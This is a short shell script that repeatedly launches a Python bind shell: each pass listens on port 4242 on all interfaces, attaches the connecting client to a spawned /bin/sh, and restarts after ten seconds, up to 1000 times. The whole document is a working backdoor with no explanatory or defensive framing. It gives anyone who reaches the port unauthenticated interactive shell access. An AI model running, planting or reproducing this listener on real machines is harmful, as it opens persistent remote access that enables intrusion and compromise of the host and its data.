#!/bin/sh

for i in `seq 1 1000`
do
	python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.bind(("0.0.0.0", 4242));s.listen();c,addr=s.accept();os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2); pty.spawn("/bin/sh"); c.close(); s.close()'
	sleep 10
done